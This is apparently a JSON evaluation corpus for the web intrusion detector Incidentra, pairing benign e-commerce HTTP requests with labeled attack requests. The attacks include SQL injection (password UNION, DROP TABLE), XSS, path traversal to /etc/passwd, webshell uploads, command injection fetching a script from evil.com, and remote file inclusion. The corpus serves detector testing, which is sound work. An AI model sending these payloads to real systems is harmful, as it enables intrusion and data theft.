@@ -1,0 +1,397 @@
+{
+  "description": "Labeled benign/attack corpus used for Incidentra's supplementary precision/recall/F1 evaluation (IEEE camera-ready).",
+  "benign": [
+    {
+      "method": "GET",
+      "path": "/",
+      "query": "",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36"
+    },
+    {
+      "method": "GET",
+      "path": "/products",
+      "query": "category=electronics&sort=price_asc",
+      "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Safari/605.1.15"
+    },
+    {
+      "method": "GET",
+      "path": "/products/42",
+      "query": "",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36"
+    },
+    {
+      "method": "GET",
+      "path": "/search",
+      "query": "q=wireless+mouse",
+      "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15"
+    },
+    {
+      "method": "GET",
+      "path": "/search",
+      "query": "q=office+chair+ergonomic",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36"
+    },
+    {
+      "method": "POST",
+      "path": "/cart/add",
+      "query": "product_id=17&qty=2",
+      "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Safari/605.1.15"
+    },
+    {
+      "method": "GET",
+      "path": "/cart",
+      "query": "",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36"
+    },
+    {
+      "method": "POST",
+      "path": "/checkout",
+      "query": "address=Jl.+Sudirman+No.+10&city=Bekasi",
+      "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15"
+    },
+    {
+      "method": "POST",
+      "path": "/login",
+      "query": "username=budi.santoso&password=Pass123!",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36"
+    },
+    {
+      "method": "POST",
+      "path": "/login",
+      "query": "username=sinta.dewi&password=Correct1!",
+      "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Safari/605.1.15"
+    },
+    {
+      "method": "GET",
+      "path": "/account/profile",
+      "query": "",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36"
+    },
+    {
+      "method": "POST",
+      "path": "/account/update",
+      "query": "name=Budi+Santoso&email=budi%40example.com",
+      "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Safari/605.1.15"
+    },
+    {
+      "method": "GET",
+      "path": "/static/css/main.css",
+      "query": "",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36"
+    },
+    {
+      "method": "GET",
+      "path": "/static/js/app.js",
+      "query": "",
+      "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Safari/605.1.15"
+    },
+    {
+      "method": "GET",
+      "path": "/images/product-42.jpg",
+      "query": "",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36"
+    },
+    {
+      "method": "GET",
+      "path": "/favicon.ico",
+      "query": "",
+      "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15"
+    },
+    {
+      "method": "GET",
+      "path": "/about",
+      "query": "",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36"
+    },
+    {
+      "method": "GET",
+      "path": "/contact",
+      "query": "",
+      "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Safari/605.1.15"
+    },
+    {
+      "method": "POST",
+      "path": "/contact/send",
+      "query": "name=Andi&message=Kapan+promo+lagi%3F",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36"
+    },
+    {
+      "method": "GET",
+      "path": "/orders",
+      "query": "status=shipped",
+      "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15"
+    },
+    {
+      "method": "GET",
+      "path": "/orders/1029",
+      "query": "",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36"
+    },
+    {
+      "method": "POST",
+      "path": "/reviews/add",
+      "query": "product_id=17&rating=5&text=Bagus+sekali+recommended",
+      "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Safari/605.1.15"
+    },
+    {
+      "method": "GET",
+      "path": "/products",
+      "query": "category=furniture%26decor",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36"
+    },
+    {
+      "method": "GET",
+      "path": "/products",
+      "query": "q=file+organizer+for+desk",
+      "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15"
+    },
+    {
+      "method": "POST",
+      "path": "/newsletter/subscribe",
+      "query": "email=dewi%40example.com",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36"
+    },
+    {
+      "method": "GET",
+      "path": "/products/compare",
+      "query": "ids=12,17,42",
+      "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Safari/605.1.15"
+    },
+    {
+      "method": "GET",
+      "path": "/help/faq",
+      "query": "topic=shipping-and-returns",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36"
+    },
+    {
+      "method": "POST",
+      "path": "/wishlist/add",
+      "query": "product_id=8",
+      "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15"
+    },
+    {
+      "method": "GET",
+      "path": "/products",
+      "query": "sort=name&order=asc",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36"
+    },
+    {
+      "method": "POST",
+      "path": "/login",
+      "query": "username=admin&password=WrongPassOnce1",
+      "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Safari/605.1.15"
+    }
+  ],
+  "attacks": [
+    {
+      "method": "GET",
+      "path": "/products",
+      "query": "id=1 OR 1=1",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
+      "label": "SQL_INJECTION"
+    },
+    {
+      "method": "GET",
+      "path": "/products",
+      "query": "id=1' UNION SELECT username,password FROM users--",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
+      "label": "SQL_INJECTION"
+    },
+    {
+      "method": "POST",
+      "path": "/login",
+      "query": "username=admin'--&password=x",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
+      "label": "SQL_INJECTION"
+    },
+    {
+      "method": "GET",
+      "path": "/products",
+      "query": "id=1; DROP TABLE users;",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
+      "label": "SQL_INJECTION"
+    },
+    {
+      "method": "GET",
+      "path": "/search",
+      "query": "q=1' AND SLEEP(5)--",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
+      "label": "SQL_INJECTION"
+    },
+    {
+      "method": "GET",
+      "path": "/products",
+      "query": "id=1 AND 1=CONVERT(int,(SELECT @@version))",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
+      "label": "SQL_INJECTION"
+    },
+    {
+      "method": "GET",
+      "path": "/products",
+      "query": "id=(SELECT+1+FROM+information_schema.tables)",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
+      "label": "SQL_INJECTION"
+    },
+    {
+      "method": "GET",
+      "path": "/search",
+      "query": "q=<script>alert(document.cookie)</script>",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
+      "label": "XSS"
+    },
+    {
+      "method": "POST",
+      "path": "/reviews/add",
+      "query": "text=<img src=x onerror=alert(1)>",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
+      "label": "XSS"
+    },
+    {
+      "method": "GET",
+      "path": "/products",
+      "query": "q=<svg/onload=alert(1)>",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
+      "label": "XSS"
+    },
+    {
+      "method": "GET",
+      "path": "/products",
+      "query": "q=javascript:alert(1)",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
+      "label": "XSS"
+    },
+    {
+      "method": "POST",
+      "path": "/contact/send",
+      "query": "message=<iframe src=javascript:alert(1)>",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
+      "label": "XSS"
+    },
+    {
+      "method": "GET",
+      "path": "/files",
+      "query": "file=../../../../etc/passwd",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
+      "label": "PATH_TRAVERSAL"
+    },
+    {
+      "method": "GET",
+      "path": "/files",
+      "query": "file=..%2f..%2f..%2fetc%2fpasswd",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
+      "label": "PATH_TRAVERSAL"
+    },
+    {
+      "method": "GET",
+      "path": "/files",
+      "query": "file=..\\..\\..\\windows\\system32\\config",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
+      "label": "PATH_TRAVERSAL"
+    },
+    {
+      "method": "GET",
+      "path": "/download",
+      "query": "path=../../boot.ini",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
+      "label": "PATH_TRAVERSAL"
+    },
+    {
+      "method": "POST",
+      "path": "/upload",
+      "query": "file=shell.php",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
+      "label": "FILE_UPLOAD"
+    },
+    {
+      "method": "POST",
+      "path": "/account/avatar",
+      "query": "avatar=backdoor.phtml",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
+      "label": "FILE_UPLOAD"
+    },
+    {
+      "method": "POST",
+      "path": "/upload",
+      "query": "file=exploit.jsp",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
+      "label": "FILE_UPLOAD"
+    },
+    {
+      "method": "GET",
+      "path": "/cmd",
+      "query": "cmd=whoami",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
+      "label": "COMMAND_INJECTION"
+    },
+    {
+      "method": "GET",
+      "path": "/ping",
+      "query": "host=127.0.0.1; cat /etc/passwd",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
+      "label": "COMMAND_INJECTION"
+    },
+    {
+      "method": "GET",
+      "path": "/ping",
+      "query": "host=127.0.0.1 && wget http://evil.com/x.sh",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
+      "label": "COMMAND_INJECTION"
+    },
+    {
+      "method": "GET",
+      "path": "/cmd",
+      "query": "cmd=`id`",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
+      "label": "COMMAND_INJECTION"
+    },
+    {
+      "method": "GET",
+      "path": "/",
+      "query": "",
+      "user_agent": "sqlmap/1.7.11#stable (http://sqlmap.org)",
+      "label": "SCANNER"
+    },
+    {
+      "method": "GET",
+      "path": "/",
+      "query": "",
+      "user_agent": "Mozilla/5.00 (Nikto/2.5.0)",
+      "label": "SCANNER"
+    },
+    {
+      "method": "GET",
+      "path": "/",
+      "query": "",
+      "user_agent": "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
+      "label": "SCANNER"
+    },
+    {
+      "method": "GET",
+      "path": "/index",
+      "query": "page=php://filter/convert.base64-encode/resource=config",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
+      "label": "LFI_RFI"
+    },
+    {
+      "method": "GET",
+      "path": "/index",
+      "query": "page=http://evil.com/shell.txt",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
+      "label": "LFI_RFI"
+    },
+    {
+      "method": "GET",
+      "path": "/files",
+      "query": "file=../../../../var/www/../../etc/passwd..",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
+      "label": "LFI_RFI"
+    },
+    {
+      "method": "POST",
+      "path": "/account/update",
+      "query": "csrf_token=missing",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
+      "label": "CSRF"
+    }
+  ]
+}
